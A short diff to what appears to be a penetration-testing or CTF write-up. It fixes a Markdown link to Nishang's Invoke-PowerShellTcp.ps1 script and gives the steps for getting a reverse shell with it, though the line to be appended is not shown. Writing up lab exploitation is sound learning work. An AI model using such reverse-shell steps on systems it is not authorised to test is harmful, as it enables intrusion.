@@ -15,7 +15,7 @@ is getting the reverse shell. For this task I'm using Nishang.
 
 Download the script;
 
-![Here is the link to the script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+[Here is the link to the script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
 copy below line to the end of the file,
 
